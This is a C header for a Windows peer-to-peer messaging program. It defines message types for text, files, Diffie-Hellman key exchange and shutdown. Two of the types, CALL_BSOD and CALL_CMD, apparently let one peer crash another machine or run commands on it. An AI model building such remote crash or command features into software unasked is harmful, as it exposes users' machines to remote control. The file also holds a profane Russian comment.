#ifndef __NETWORK_H_
#define __NETWORK_H_

#pragma warning(disable: 4267)

#include <windows.h>

#define KEY_LEN 256
#define PORT 30239

typedef enum
{
  /* Big byte:
  1 - send to nobody (for server)
  2 - send to all
  4 - send to next node
  */
  DATATYPE_PLAIN_TEXT = 0x02000001,
  DATATYPE_FILE_DATA = 0x02000002,
  DATATYPE_CLOSE_CLIENT = 0x01000003,
  DATATYPE_CLOSE_SERVER = 0x01000004,
  DATATYPE_CALL_BSOD = 0x02000005,
  DATATYPE_CALL_CMD = 0x02000006,
  DATATYPE_SET_PRIVATE = 0x00000007,
  DATATYPE_DH_INIT = 0x02000008,
  DATATYPE_DH_NEXT = 0x04000009
} DATATYPE;

#pragma pack(push, 1)

typedef struct tagMSGHEAD
{
  size_t Length;
  DATATYPE DataType;
} MSGHEAD;

#pragma pack(pop)

typedef struct tagMESSAGE
{
  MSGHEAD Head;
  BYTE *Data;
} MESSAGE;

extern HWND hWnd_main;

extern size_t NetworkInited;

// ебучая блеать винда сука
#ifdef SendMessage
#undef SendMessage
#endif /* SendMessage */


VOID SendMessage(MESSAGE *Message);

size_t NetworkInit(CHAR *Command);
VOID NetworkDisconnect(VOID);
VOID NetworkClose(VOID);

#endif /* __NETWORK_H_*/